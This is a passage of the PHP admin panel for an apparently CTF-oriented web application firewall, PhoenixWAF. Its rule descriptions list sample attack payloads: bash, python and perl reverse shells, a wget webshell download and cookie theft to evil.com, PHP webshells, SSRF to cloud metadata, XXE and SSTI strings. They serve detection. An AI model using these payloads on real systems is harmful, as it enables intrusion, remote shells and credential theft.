td{padding:6px 8px;border-bottom:1px solid rgba(30,45,74,.5);font-size:12px;word-break:break-all;transition:background .15s}
tr:hover td{background:rgba(249,115,22,.04)}
/* log search */
.log-search{margin-bottom:10px}
.log-search input{width:100%;max-width:400px;padding:7px 12px;font-size:13px}
/* textarea */
textarea{background:#060a14;border:1px solid var(--border);color:var(--text);padding:8px 10px;border-radius:5px;font-family:'Courier New',Consolas,monospace;font-size:12px;resize:vertical;outline:none;transition:border-color .2s,box-shadow .2s;width:100%}
textarea:focus{border-color:var(--accent);box-shadow:0 0 0 2px rgba(249,115,22,.15)}
/* rule detail expand */
.rule-detail{display:none;background:#060a14;border:1px solid var(--border);border-radius:5px;padding:10px;margin-top:8px;font-size:11px;color:#7dd3fc;line-height:1.7}
.rule-detail.open{display:block}
.rule-expand-btn{background:none;border:none;color:var(--text2);cursor:pointer;font-size:11px;padding:0;font-family:inherit;transition:color .2s}
.rule-expand-btn:hover{color:var(--accent)}
/* two/three col */
.two{display:grid;grid-template-columns:1fr 1fr;gap:16px}
.three{display:grid;grid-template-columns:1fr 1fr 1fr;gap:16px}
@media(max-width:1100px){.three{grid-template-columns:1fr 1fr}}
@media(max-width:750px){.two,.three{grid-template-columns:1fr}.layout{flex-direction:column}
/* 移动端：侧栏改为顶部横向可滚动导航条，而非隐藏（否则手机上锁死在单一 Tab 无法切换）*/
.sidebar{width:100%;min-width:0;flex-direction:row;overflow-x:auto;border-right:none;border-bottom:1px solid var(--border)}
.sidebar-logo,.sidebar-footer{display:none}
.nav-item{white-space:nowrap;border-left:none;border-bottom:3px solid transparent;padding:12px 14px}
.nav-item.active{border-left:none;border-bottom-color:var(--accent)}
/* 内联多列表单在窄屏折叠为单列 */
.fp-modes{grid-template-columns:1fr}}
/* v3.8 badges for new rules + leak types */
.b-nosqli{background:#3730a3}.b-ssti{background:#7c2d12}.b-jwt{background:#155e75}.b-proto{background:#4a044e}
.b-flag_leak_url,.b-flag_leak_entity,.b-flag_leak_reverse{background:#d97706;color:#000}
[class*="b-"][class$="_score"]{background:#a16207;color:#000}
/* v3.8 stat card subtle gradient */
.stat-card{background:linear-gradient(135deg,var(--card) 0%,#0c1322 100%)}
.stat-card::after{content:'';position:absolute;right:-20px;top:-20px;width:70px;height:70px;border-radius:50%;background:radial-gradient(circle,rgba(249,115,22,.06),transparent 70%);pointer-events:none}
/* v3.8 protection-strength mode selector */
.fp-modes{display:grid;grid-template-columns:repeat(auto-fit,minmax(200px,1fr));gap:10px}
.fp-mode-form{display:flex}
.fp-mode-btn{width:100%;text-align:left;display:flex;flex-direction:column;gap:6px;background:#0b1120;border:1px solid var(--border);border-radius:8px;padding:12px 14px;cursor:pointer;font-family:inherit;transition:all .2s;position:relative;overflow:hidden}
.fp-mode-btn:hover{border-color:var(--accent);transform:translateY(-2px);box-shadow:0 4px 14px rgba(0,0,0,.3)}
.fp-mode-btn.active{border-color:var(--fpc,var(--accent));background:linear-gradient(135deg,rgba(249,115,22,.08),transparent);box-shadow:0 0 0 1px var(--fpc,var(--accent)) inset,0 0 16px rgba(249,115,22,.12)}
.fp-mode-btn.active::before{content:'';position:absolute;left:0;top:0;bottom:0;width:3px;background:var(--fpc,var(--accent))}
.fp-mode-name{color:var(--text);font-size:14px;font-weight:bold;letter-spacing:1px}
.fp-mode-desc{color:var(--text2);font-size:11px;line-height:1.6}
</style></head><body>
<!-- topbar -->
<div class="topbar">
  <span class="topbar-title">&#x1F9E8; PhoenixWAF</span>
  <span style="color:var(--text2);font-size:10px">v<?= PWAF_VER ?></span>
  <div class="topbar-spacer"></div>
  <div class="topbar-info">
    <span><span class="status-dot <?= $on ? 'on' : 'off' ?>"></span>WAF <?= $on ? '<span style="color:var(--green)">运行中</span>' : '<span style="color:var(--red)">已停用</span>' ?></span>
    <span style="color:var(--text2)">&#x25B8; <?= $e($ip) ?></span>
    <form method="post" action="<?= $e($self) ?>" style="display:inline"><input type="hidden" name="waf_key" value="<?= $e($key) ?>"><input type="hidden" name="act" value="logout"><button type="submit" class="btn bs" style="padding:4px 10px;font-size:10px">退出登录</button></form>
  </div>
</div>
<div class="layout">
<!-- sidebar -->
<div class="sidebar">
  <div class="sidebar-logo">
    <div class="logo-text">PHOENIX</div>
    <div class="logo-ver">WAF v<?= PWAF_VER ?></div>
  </div>
  <div class="nav-item active" onclick="showTab('dashboard',this)"><span class="nav-icon">&#x25A3;</span> 概览</div>
  <div class="nav-item" onclick="showTab('rules',this)"><span class="nav-icon">&#x2630;</span> 检测规则</div>
  <div class="nav-item" onclick="showTab('ipmgmt',this)"><span class="nav-icon">&#x2316;</span> IP 管理</div>
  <div class="nav-item" onclick="showTab('logs',this)"><span class="nav-icon">&#x2261;</span> 攻击日志</div>
  <div class="nav-item" onclick="showTab('integrity',this)"><span class="nav-icon">&#x26A0;</span> 文件完整性</div>
  <div class="nav-item" onclick="showTab('forward',this)"><span class="nav-icon">&#x21C4;</span> 流量转发</div>
  <div class="nav-item" onclick="showTab('flagsub',this)"><span class="nav-icon">&#x2691;</span> 自动提交</div>
  <div class="nav-item" onclick="showTab('replay',this)"><span class="nav-icon">&#x21BA;</span> 流量重放</div>
  <div class="nav-item" onclick="showTab('autoreap',this)"><span class="nav-icon">&#x221E;</span> 全流量(支持盲打/搅屎)</div>
  <div class="sidebar-footer" style="color:var(--text2);font-size:11px">&#x25CF; 会话有效</div>
</div>
<!-- main -->
<div class="main">

<!-- DASHBOARD TAB -->
<div id="tab-dashboard" class="tab-panel active">
<div class="stats-grid">
  <div class="stat-card c-orange"><div class="stat-label">拦截总数</div><div class="stat-val orange"><?= number_format($stats['total']) ?></div></div>
  <div class="stat-card c-red"><div class="stat-label">已封锁</div><div class="stat-val red"><?= number_format($stats['blocked']) ?></div></div>
  <div class="stat-card c-cyan"><div class="stat-label">攻击来源 IP</div><div class="stat-val cyan"><?= count($stats['by_ip']) ?></div></div>
  <div class="stat-card <?= $stats['int_alerts'] > 0 ? 'c-alert' : 'c-green' ?>"><div class="stat-label">文件完整性告警</div><div class="stat-val" style="color:<?= $stats['int_alerts'] > 0 ? 'var(--red)' : 'var(--green)' ?>"><?= $stats['int_alerts'] ?></div></div>
<?php $fpm = (isset($cfg['fp_mode']) ? $cfg['fp_mode'] : 'balanced');
$fpm_label = ['balanced'=>'均衡','strict'=>'严格','paranoid'=>'偏执'];
$fpm_color = ['balanced'=>'var(--green)','strict'=>'var(--accent)','paranoid'=>'var(--red)']; ?>
  <div class="stat-card c-cyan"><div class="stat-label">防护强度</div><div class="stat-val" style="font-size:22px;color:<?= (isset($fpm_color[$fpm]) ? $fpm_color[$fpm] : 'var(--cyan)') ?>"><?= (isset($fpm_label[$fpm]) ? $fpm_label[$fpm] : $e($fpm)) ?></div></div>
</div>

<div class="sec"><div class="sec-title">快捷操作</div>
<div class="ctrl-bar">
<form method="post" action="<?= $e($self) ?>"><input type="hidden" name="waf_key" value="<?= $e($key) ?>"><input type="hidden" name="act" value="toggle_waf"><button type="submit" class="btn <?= $on ? 'br' : 'bg' ?>"><?= $on ? '&#x25A0; 停用 WAF' : '&#x25B6; 启用 WAF' ?></button></form>
<form method="post" action="<?= $e($self) ?>"><input type="hidden" name="waf_key" value="<?= $e($key) ?>"><input type="hidden" name="act" value="toggle_autoban"><button type="submit" class="btn <?= !empty($cfg['auto_ban']) ? 'br' : 'bs' ?>" title="自动拉黑攻击 IP（默认关闭，防止误封裁判机）">自动拉黑: <?= !empty($cfg['auto_ban']) ? '<span style="color:#4ade80">开</span>' : '<span style="color:#f87171">关</span>' ?></button></form>
<form method="post" action="<?= $e($self) ?>"><input type="hidden" name="waf_key" value="<?= $e($key) ?>"><input type="hidden" name="act" value="toggle_stealth"><button type="submit" class="btn bs" title="隐身模式：拦截时返回假 200，迷惑攻击者">隐身模式: <?= !empty($cfg['stealth']) ? '<span style="color:#4ade80">开</span>' : '<span style="color:#f87171">关</span>' ?></button></form>
<form method="post" action="<?= $e($self) ?>" style="display:flex;gap:6px;align-items:center"><input type="hidden" name="waf_key" value="<?= $e($key) ?>"><input type="hidden" name="act" value="fake_flag"><input type="text" name="ff" value="<?= $e($cfg['fake_flag']) ?>" style="width:220px" placeholder="假 flag 内容"><button type="submit" class="btn bo">设置假 Flag</button></form>
<form method="post" action="<?= $e($self) ?>"><input type="hidden" name="waf_key" value="<?= $e($key) ?>"><input type="hidden" name="act" value="update_baseline"><button type="submit" class="btn bs" onclick="return confirm('更新文件完整性基线？')">更新基线</button></form>
<form method="post" action="<?= $e($self) ?>"><input type="hidden" name="waf_key" value="<?= $e($key) ?>"><input type="hidden" name="act" value="export_csv"><button type="submit" class="btn bs">导出 CSV</button></form>
<form method="post" action="<?= $e($self) ?>" onsubmit="return confirm('确认清空日志？')"><input type="hidden" name="waf_key" value="<?= $e($key) ?>"><input type="hidden" name="act" value="clear_log"><button type="submit" class="btn br">清空日志</button></form>
<form method="post" action="<?= $e($self) ?>" onsubmit="return confirm('紧急清理：杀掉可疑进程、清空 crontab、清理 /tmp 脚本？\n此操作不可撤销！')"><input type="hidden" name="waf_key" value="<?= $e($key) ?>"><input type="hidden" name="act" value="kill_processes"><button type="submit" class="btn br" title="杀掉反弹shell/挖矿进程、清空crontab、清理/tmp脚本">&#x1F4A3; 紧急清理</button></form>
<form method="post" action="<?= $e($self) ?>" style="display:flex;gap:6px;align-items:center"><input type="hidden" name="waf_key" value="<?= $e($key) ?>"><input type="hidden" name="act" value="save_openbasedir"><input type="text" name="open_basedir" value="<?= $e(isset($cfg['open_basedir']) ? $cfg['open_basedir'] : '') ?>" style="width:220px" placeholder="open_basedir 路径（空=不限制）" title="限制 PHP 文件操作范围，如 /var/www/html"><button type="submit" class="btn bs">设置 basedir</button></form>
</div></div>

<?php $fpmode = (isset($cfg['fp_mode']) ? $cfg['fp_mode'] : 'balanced');
$fp_meta = [
  'balanced' => ['均衡', '低置信规则累计评分才拦截，误报最低（推荐，防止误封业务/裁判机）', 'var(--green)'],
  'strict'   => ['严格', '恢复传统一击拦截，检出率更高，误报略增', 'var(--accent)'],
  'paranoid' => ['偏执', '零漏报优先：所有规则一击拦截 + 拼接输入扩大规则面（高危决赛场使用）', 'var(--red)'],
]; ?>
<div class="sec"><div class="sec-title">防护强度 · 误报控制</div>
<div class="fp-modes">
<?php foreach ($fp_meta as $mk => $mv): $act = ($fpmode === $mk); ?>
  <form method="post" action="<?= $e($self) ?>" class="fp-mode-form">
    <input type="hidden" name="waf_key" value="<?= $e($key) ?>">
    <input type="hidden" name="act" value="set_fpmode">
    <input type="hidden" name="fp_mode" value="<?= $e($mk) ?>">
    <button type="submit" class="fp-mode-btn <?= $act ? 'active' : '' ?>" style="<?= $act ? '--fpc:'.$mv[2] : '' ?>">
      <span class="fp-mode-name"><?= $e($mv[0]) ?><?= $act ? ' <b style="color:'.$mv[2].'">●</b>' : '' ?></span>
      <span class="fp-mode-desc"><?= $e($mv[1]) ?></span>
    </button>
  </form>
<?php endforeach; ?>
</div>
<div class="ctrl-bar" style="margin-top:12px">
  <form method="post" action="<?= $e($self) ?>"><input type="hidden" name="waf_key" value="<?= $e($key) ?>"><input type="hidden" name="act" value="toggle_static"><button type="submit" class="btn <?= !empty($cfg['static_bypass']) ? 'bg' : 'bs' ?>" title="对 css/js/图片/字体等静态资源快速放行，杜绝误报并提速">静态资源放行: <?= !empty($cfg['static_bypass']) ? '<span style="color:#4ade80">开</span>' : '<span style="color:#f87171">关</span>' ?></button></form>
  <span style="color:var(--text2);font-size:11px;align-self:center">当前评分阈值: <b style="color:var(--cyan)"><?= (int)(isset($cfg['score_threshold']) ? $cfg['score_threshold'] : 2) ?></b> 次低置信命中 → 拦截</span>
</div>
</div>

<div class="sec"><div class="sec-title">Top 攻击者</div>
<table><tr><th>IP 地址</th><th>次数</th><th>操作</th></tr>
<?php foreach ($stats['by_ip'] as $aip => $cnt): ?>
<tr><td><?= $e($aip) ?></td><td style="color:var(--red)"><?= $cnt ?></td><td>
<form method="post" action="<?= $e($self) ?>" style="display:inline"><input type="hidden" name="waf_key" value="<?= $e($key) ?>"><input type="hidden" name="act" value="add_bl"><input type="hidden" name="ip" value="<?= $e($aip) ?>"><button type="submit" class="btn br" style="padding:3px 8px;font-size:10px">封禁</button></form>
</td></tr><?php endforeach; ?></table></div>
</div><!-- /dashboard -->

<!-- RULES TAB -->
<div id="tab-rules" class="tab-panel">
<?php
$rule_info = [
    'sqli' => [
        'SQL 注入',
        "检测 UNION SELECT 联合查询注入、布尔盲注（AND/OR 条件）、时间盲注（SLEEP/BENCHMARK/WAITFOR）、报错注入（EXTRACTVALUE/UPDATEXML/EXP）、堆叠注入（; DROP/INSERT）、LOAD_FILE 文件读取、information_schema 信息泄露、ORDER BY 列数探测、CHAR()/CONCAT() 函数混淆、0x 十六进制编码绕过。支持多层 URL 编码、全角字符、注释符（/**/、--、#）绕过检测。",
        "' UNION SELECT 1,2,3--\n1 AND SLEEP(5)--\n1 AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--\n1; DROP TABLE users--\n' OR '1'='1\n1 ORDER BY 3--\n1 AND (SELECT 1 FROM information_schema.tables LIMIT 1)=1\n1 AND BENCHMARK(5000000,MD5(1))\nUNION/**/SELECT/**/null,null,null--\n1' AND 1=CONVERT(int,(SELECT TOP 1 name FROM sysobjects))--"
    ],
    'cmdi' => [
        '命令注入',
        "检测 PHP 命令执行函数（system/exec/passthru/shell_exec/popen/proc_open/pcntl_exec）、反引号执行（\`cmd\`）、\$(cmd) 子shell、Shell 元字符（; | & ||）拼接命令、wget/curl 远程下载、/dev/tcp 反弹 shell、base64 管道解码执行、Python/Perl/Ruby 单行 shell、LD_PRELOAD 提权、FFI 调用、chmod 权限修改、crontab 持久化。",
        "; id\n| cat /etc/passwd\n\`whoami\`\n\$(id)\n; wget http://evil.com/shell.php -O /tmp/s.php\n; bash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n; python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"10.0.0.1\",4444));os.dup2(s.fileno(),0);pty.spawn(\"/bin/sh\")'\n; echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS80NDQ0IDA+JjE= | base64 -d | bash\n; perl -e 'use Socket;\$i=\"10.0.0.1\";\$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));connect(S,sockaddr_in(\$p,inet_aton(\$i)));open(STDIN,\">&S\");'"
    ],
    'lfi' => [
        '文件包含 / 路径穿越',
        "检测 ../ 目录穿越（多层编码：%2e%2e%2f / %252e%252e%252f）、PHP 伪协议（php://filter 读取源码、php://input 代码执行、data:// 内联执行、phar:// 反序列化、expect:// 命令执行、zip:// 压缩包执行）、glob:// 目录枚举、compress.zlib:// 压缩流、/etc/passwd /etc/shadow /proc/self/environ 等敏感文件读取、Null 字节截断（%00）、include/require 路径注入。",
        "../../etc/passwd\n../../../etc/shadow\nphp://filter/convert.base64-encode/resource=index.php\nphp://filter/read=convert.iconv.UTF-8.UTF-16/resource=flag.php\nphp://input (POST: <?php system('id');)\ndata://text/plain,<?php system('id');\nphar://upload/evil.jpg/shell.php\nexpect://id\n/proc/self/environ\n/proc/self/fd/0\n....//....//etc/passwd (双写绕过)\n%2e%2e%2f%2e%2e%2fetc%2fpasswd"
    ],
    'xss' => [
        '跨站脚本 (XSS)',
        "检测反射/存储/DOM型 XSS：<script> 标签、on* 事件处理器（onerror/onload/onclick 等）、javascript:/vbscript: 伪协议、data:text/html 内联 HTML、SVG/iframe/object/embed/applet 标签、CSS expression()、模板注入（{{7*7}} / {%...%}）、srcdoc 属性、img src=javascript:、details/summary/marquee 等 HTML5 标签。支持大小写混淆、标签嵌套、编码绕过检测。",
        "<script>alert(document.cookie)</script>\n<img src=x onerror=alert(1)>\n<svg onload=alert(1)>\njavascript:alert(1)\n<iframe src=\"javascript:alert(1)\">\n<details open ontoggle=alert(1)>\n<body onload=alert(1)>\n<input autofocus onfocus=alert(1)>\n{{7*7}} (模板注入)\n<script>fetch('http://evil.com/?c='+document.cookie)</script>\n<img src=1 onerror=\"eval(atob('YWxlcnQoMSk='))\">"
    ],
    'code' => [
        'PHP 代码注入',
        "检测 eval()/assert() 动态代码执行、create_function() 匿名函数注入、preg_replace /e 修饰符执行、array_map/array_filter/usort 回调注入、call_user_func 动态调用、\$\$ 变量变量、\$var(\$_GET[x]) 动态函数调用、base64_decode/str_rot13/gzinflate 解码后执行、highlight_file/show_source 源码泄露、PHP 标签（文件上传场景）、str_rot13 混淆的函数名（flfgrz=system）。",
        "eval(\$_GET['x'])\nassert(phpinfo())\nassert(base64_decode(\$_POST['x']))\ncreate_function('',\$_GET['x'])()\npreg_replace('/.*/e',\$_POST['x'],'')\ncall_user_func('system',\$_GET['cmd'])\n\$f=\$_GET['f'];\$f(\$_GET['x'])\nbase64_decode(\$_POST['x']) → eval()\nstr_rot13('flfgrz')(\$_GET['cmd']) → system()\n<?php @eval(\$_POST['ant']); ?> (蚁剑 webshell)"
    ],
    'ssrf' => [
        '服务端请求伪造 (SSRF)',
        "检测内网 IP 访问（10.x/172.16-31.x/192.168.x）、localhost/127.0.0.1/0.0.0.0、IPv6 ::1、AWS 元数据服务（169.254.169.254）、GCP 元数据（metadata.google.internal）、file:// 本地文件读取、dict:// 端口探测、gopher:// 协议攻击（Redis/MySQL/SMTP）、ldap:// 注入、十六进制/十进制 IP 编码绕过（0x7f000001/2130706433）。",
        "http://127.0.0.1/admin\nhttp://192.168.1.1/\nhttp://10.0.0.1:6379/ (Redis)\nhttp://169.254.169.254/latest/meta-data/iam/security-credentials/\nhttp://metadata.google.internal/computeMetadata/v1/\nfile:///etc/passwd\ndict://127.0.0.1:6379/info\ngopher://127.0.0.1:6379/_*1%0d%0a\$8%0d%0aflushall%0d%0a\nhttp://0x7f000001/ (十六进制绕过)\nhttp://2130706433/ (十进制绕过)"
    ],
    'xxe' => [
        'XML 外部实体注入 (XXE)',
        "检测 XML DOCTYPE 声明中的外部实体定义（<!DOCTYPE [<!ENTITY>]>）、SYSTEM 关键字引用外部资源（file:///etc/passwd / http:// / php://）、参数实体（% 实体）用于盲 XXE 外带数据、expect:// 命令执行。可导致任意文件读取、SSRF、拒绝服务（Billion Laughs）。",
        "<?xml version=\"1.0\"?>\n<!DOCTYPE foo [\n  <!ENTITY xxe SYSTEM \"file:///etc/passwd\">\n]>\n<root>&xxe;</root>\n\n<!-- 盲 XXE 外带 -->\n<!DOCTYPE foo [\n  <!ENTITY % dtd SYSTEM \"http://evil.com/evil.dtd\">\n  %dtd;\n]>\n\n<!-- Billion Laughs DoS -->\n<!DOCTYPE lolz [\n  <!ENTITY lol \"lol\">\n  <!ENTITY lol2 \"&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;\">\n]>"
    ],
    'unserialize' => [
        'PHP/Java 反序列化',
        "检测 PHP 序列化对象字符串（O:N:\"ClassName\":N:{...}）、数组嵌套对象（a:N:{...O:N:...}）、自定义序列化（C:N:\"ClassName\":N:{...}）、Java 序列化魔数（aced0005）、.NET ViewState（/wEP...）。反序列化漏洞可触发 POP 链执行任意代码，常见于 Laravel/ThinkPHP/Yii/Symfony 等框架。",
        "O:8:\"stdClass\":1:{s:3:\"cmd\";s:2:\"id\";}\nO:19:\"Illuminate\\\\Support\\\\Carbon\":1:{s:4:\"date\";s:19:\"2023-01-01 00:00:00\";}\na:2:{i:0;O:8:\"stdClass\":1:{s:3:\"cmd\";s:6:\"whoami\";}i:1;s:4:\"test\";}\nC:11:\"ArrayObject\":37:{x:i:0;a:1:{s:3:\"cmd\";s:2:\"id\";};}\naced0005 (Java 序列化)\n/wEPDwUKLTM2... (.NET ViewState)"
    ],
    'upload' => [
        '恶意文件上传',
        "检测上传文件内容中的 PHP 标签（<?php / <?=）、危险函数调用（eval/assert/system/exec 等接收用户输入）、base64 解码执行链、str_rot13+gzinflate 混淆 webshell、preg_replace /e 执行、JSP/ASP/ASPX 脚本标签、危险扩展名（.php3/.php5/.phtml/.phar/.shtml/.cgi/.asp/.aspx/.jsp）。绕过技巧：双扩展名（shell.php.jpg）、大小写（Shell.PHP）、MIME 伪造。",
        '<' . '?php @eval($_POST[\'ant\']); ?' . '>' . "\n" . '<' . '?php system($_GET[\'cmd\']); ?' . '>' . "\n" . '<' . '?= passthru($_GET[\'c\']); ?' . '>' . "\n" . '<' . '?php \$f=base64_decode($_POST[\'x\']);eval(\$f); ?' . '>' . "\n" . '<' . '?php \$f=str_rot13(\'flfgrz\');\$f(\$_GET[\'c\']); ?' . '>' . "\n" . "文件名: shell.php.jpg / shell.phtml / shell.php5\nJSP: <%Runtime.getRuntime().exec(request.getParameter(\"cmd\"));%>"
    ],
    'response' => [
        '响应 Flag 拦截',
        "监控 PHP 脚本的输出内容，检测并替换 flag 泄露。支持：直接明文 flag（flag{...}）、Base64 编码 flag（Zmxh 开头）、十六进制编码 flag（666c61677b 开头）、Shell 命令输出（/etc/passwd 内容、uid=0(root) 等）。捕获到 flag 后自动替换为假 flag，并可触发自动提交功能。注意：仅对 PHP 处理的请求有效，静态文件需配合 .htaccess ForceType 使用。",
        "flag{real_flag_here}\nZmxhZ3tyZWFsX2ZsYWdfaGVyZX0= (base64)\n666c61677b7265616c5f666c61675f686572657d (hex)\nroot:x:0:0:root:/root:/bin/bash (shell输出)\nuid=0(root) gid=0(root) groups=0(root)"
    ],
    'bypass' => [
        '高级混淆与绕过',
        '针对 AWD 实战中常用的高阶语法绕过技术进行检测。拦截基于异或/取反的无字母数字 WebShell、超全局变量动态函数调用、高密度十六进制/八进制编码、命名空间转义绕过、内联注释强行打断关键字、以及多重变量动态拼接等手段。',
        '~"\x8c\x86\x8c\x8b\x9a\x8d"();' . "\n" . '$_GET[\'a\']($_POST[\'b\']);' . "\n" . '\system(\'id\');' . "\n" . 's/*w*/y/*w*/s/*w*/t/*w*/e/*w*/m(\'id\');' . "\n" . '$a="s";$b="ys";$c="tem";($a.$b.$c)(\'id\');'
    ],
    'nosqli' => [
        'NoSQL 注入',
        '检测 MongoDB 等 NoSQL 数据库的运算符注入。拦截通过数组/JSON 传入的 $ne/$gt/$gte/$lt/$regex/$where/$exists 等查询运算符，以及 $where JavaScript 条件注入。常见于 param[$ne]=1 型登录绕过与 JSON body 注入。',
        'username[$ne]=1&password[$ne]=1' . "\n" . '{"user":{"$gt":""},"pass":{"$gt":""}}' . "\n" . '{"$where":"this.password==this.username"}' . "\n" . 'id[$regex]=^admin'
    ],
    'ssti' => [
        'SSTI 模板注入',
        '检测服务端模板注入。覆盖 Twig/Jinja2/Smarty/Freemarker/Velocity/ERB 等引擎：{{7*7}} 数学求值、{{config}}/{{self}}/__class__/__subclasses__ 沙箱逃逸、{% ... %} 控制结构、Smarty {php} 标签、${T(...)} SpEL、<%= system %> ERB。',
        '{{7*7}}' . "\n" . '{{config.items()}}' . "\n" . "{{''.__class__.__mro__[1].__subclasses__()}}" . "\n" . '{php}system("id"){/php}' . "\n" . '${T(java.lang.Runtime).getRuntime().exec("id")}'
    ],
    'jwt' => [
        'JWT 弱算法伪造',
        '检测 JWT 令牌的 alg:none 无签名伪造与算法混淆攻击。识别 header 声明为 none/None/NONE 的 base64 变体，攻击者借此绕过签名校验伪造任意身份令牌。',
        'eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ.' . "\n" . '{"alg":"none","typ":"JWT"}'
    ],
    'proto' => [
        '危险协议 / 封装',
        '检测危险的伪协议与封装器：phar:// 反序列化、php://filter 链式过滤器读取源码/触发链、gopher/dict/ldap/jar 协议 SSRF、pearcmd.php 无文件 RCE、PHP_SESSION_UPLOAD_PROGRESS 上传进度竞态、以及反代场景下的 ${jndi:} 形式载荷。',
        'phar://uploads/x.jpg/shell' . "\n" . 'php://filter/convert.iconv.UTF8.UCS-2LE/resource=flag' . "\n" . 'gopher://127.0.0.1:6379/_flushall' . "\n" . '?+config-create+/&file=pearcmd'
    ],
];
?>
<div class="sec"><div class="sec-title">内置检测规则</div>
<?php foreach ($cfg['rules'] as $r => $en): $info = (isset($rule_info[$r]) ? $rule_info[$r] : [$r, '', '']); ?>
<div class="rule-row">
  <div class="rule-header">
    <div class="rule-info">
      <span class="b b-<?= $e($r) ?>" style="flex-shrink:0"><?= $e($r) ?></span>
      <span style="color:var(--text);font-size:13px;font-weight:bold;white-space:nowrap;overflow:hidden;text-overflow:ellipsis"><?= $e($info[0]) ?></span>
      <button type="button" class="rule-expand-btn" onclick="toggleDetail('rd-<?= $e($r) ?>')">&#9656; 详情</button>
    </div>
    <form method="post" action="<?= $e($self) ?>" class="rule-toggle-form">
      <input type="hidden" name="waf_key" value="<?= $e($key) ?>">
      <input type="hidden" name="act" value="toggle_rule">
      <input type="hidden" name="rule" value="<?= $e($r) ?>">
      <label class="toggle-switch" title="<?= $en ? '点击关闭' : '点击开启' ?>">
        <input type="checkbox" <?= $en ? 'checked' : '' ?> onchange="this.form.submit()">
        <span class="toggle-slider"></span>
      </label>
    </form>
  </div>
  <div id="rd-<?= $e($r) ?>" class="rule-detail">
    <div style="color:var(--text);margin-bottom:8px;line-height:1.8;font-size:12px"><?= $e($info[1]) ?></div>
    <div style="color:#fbbf24;font-size:10px;margin-bottom:4px;text-transform:uppercase;letter-spacing:1px">示例 Payload：</div>
    <pre style="color:#7dd3fc;font-size:11px;white-space:pre-wrap;background:#030712;padding:8px;border-radius:4px;border:1px solid var(--border)"><?= $e($info[2]) ?></pre>
  </div>
</div><?php endforeach; ?>
</div>

<div class="sec"><div class="sec-title">自定义规则</div>
<?php if (!empty($cfg['custom_rules'])): ?>
<?php foreach ($cfg['custom_rules'] as $rname => $rcfg): ?>
<div class="toggle-wrap">
  <div style="display:flex;align-items:center;gap:8px;flex:1">
    <span class="b" style="background:#1e3a5f"><?= $e($rname) ?></span>
    <code style="color:#7dd3fc;font-size:11px;flex:1;overflow:hidden;text-overflow:ellipsis;white-space:nowrap"><?= $e($rcfg['pat']) ?></code>
    <span style="color:var(--text2);font-size:10px">范围: <?= $e((isset($rcfg['scope']) ? $rcfg['scope'] : 'all')) ?></span>
  </div>
  <div style="display:flex;gap:6px;align-items:center">
    <form method="post" action="<?= $e($self) ?>" style="display:inline">
      <input type="hidden" name="waf_key" value="<?= $e($key) ?>">
      <input type="hidden" name="act" value="toggle_custom_rule">
      <input type="hidden" name="rname" value="<?= $e($rname) ?>">
      <label class="toggle-switch">
        <input type="checkbox" <?= !empty($rcfg['enabled']) ? 'checked' : '' ?> onchange="this.form.submit()">
        <span class="toggle-slider"></span>
      </label>
    </form>
    <form method="post" action="<?= $e($self) ?>" style="display:inline" onsubmit="return confirm('删除规则 <?= $e($rname) ?>？')">
      <input type="hidden" name="waf_key" value="<?= $e($key) ?>">
      <input type="hidden" name="act" value="del_custom_rule">
      <input type="hidden" name="rname" value="<?= $e($rname) ?>">
      <button type="submit" class="btn br" style="padding:3px 8px;font-size:10px">删除</button>
    </form>
  </div>
</div><?php endforeach; ?>
<?php else: ?>
<div style="color:var(--text2);font-size:12px;padding:8px 0">暂无自定义规则</div>
<?php endif; ?>

<div style="margin-top:14px;padding-top:14px;border-top:1px solid var(--border)">
<div style="color:var(--text2);font-size:11px;margin-bottom:10px">添加自定义规则（PCRE 正则）</div>
<form method="post" action="<?= $e($self) ?>">
  <input type="hidden" name="waf_key" value="<?= $e($key) ?>">
  <input type="hidden" name="act" value="add_custom_rule">
  <div style="display:grid;grid-template-columns:1fr 2fr 1fr auto;gap:8px;align-items:end">
    <div>
      <div style="color:var(--text2);font-size:10px;margin-bottom:4px">规则名称</div>
      <input type="text" name="rname" placeholder="my_rule" style="width:100%">
    </div>
    <div>
      <div style="color:var(--text2);font-size:10px;margin-bottom:4px">正则表达式（PCRE，含分隔符）</div>
      <input type="text" name="rpat" placeholder="/evil_keyword/i" style="width:100%">
    </div>
    <div>
      <div style="color:var(--text2);font-size:10px;margin-bottom:4px">检测范围</div>
      <select name="rscope" style="background:#060a14;border:1px solid var(--border);color:var(--text);padding:6px 8px;border-radius:5px;font-family:inherit;font-size:12px;width:100%">
        <option value="all">全部输入</option>
        <option value="GET">GET 参数</option>
        <option value="POST">POST 参数</option>
        <option value="COOKIE">Cookie</option>
        <option value="HDR">请求头</option>
        <option value="BODY">请求体</option>
      </select>
    </div>
    <button type="submit" class="btn bo">添加规则</button>
  </div>
</form>
</div>
</div>
</div><!-- /rules -->


<!-- IP MGMT TAB -->
<div id="tab-ipmgmt" class="tab-panel">
<div class="two">
<div>
<div class="sec"><div class="sec-title" style="color:var(--green)">白名单</div>
<div style="margin-bottom:10px;line-height:1.8">
<?php foreach ($cfg['whitelist'] as $wi): ?><span class="iptag"><?= $e($wi) ?><form method="post" action="<?= $e($self) ?>" style="display:inline"><input type="hidden" name="waf_key" value="<?= $e($key) ?>"><input type="hidden" name="act" value="rm_ip"><input type="hidden" name="list" value="wl"><input type="hidden" name="ip" value="<?= $e($wi) ?>"><button type="submit">&#xD7;</button></form></span><?php endforeach; ?>
</div>
<form method="post" action="<?= $e($self) ?>" style="display:flex;gap:6px"><input type="hidden" name="waf_key" value="<?= $e($key) ?>"><input type="hidden" name="act" value="add_wl"><input type="text" name="ip" placeholder="IP 地址" style="flex:1"><button type="submit" class="btn bg">添加</button></form>
</div>

<div class="sec" style="margin-top:16px"><div class="sec-title" style="color:var(--red)">黑名单 <span style="color:var(--text2);font-weight:normal">(<?= count($cfg['blacklist']) ?>)</span></div>
<div style="max-height:160px;overflow-y:auto;margin-bottom:10px;line-height:1.8">
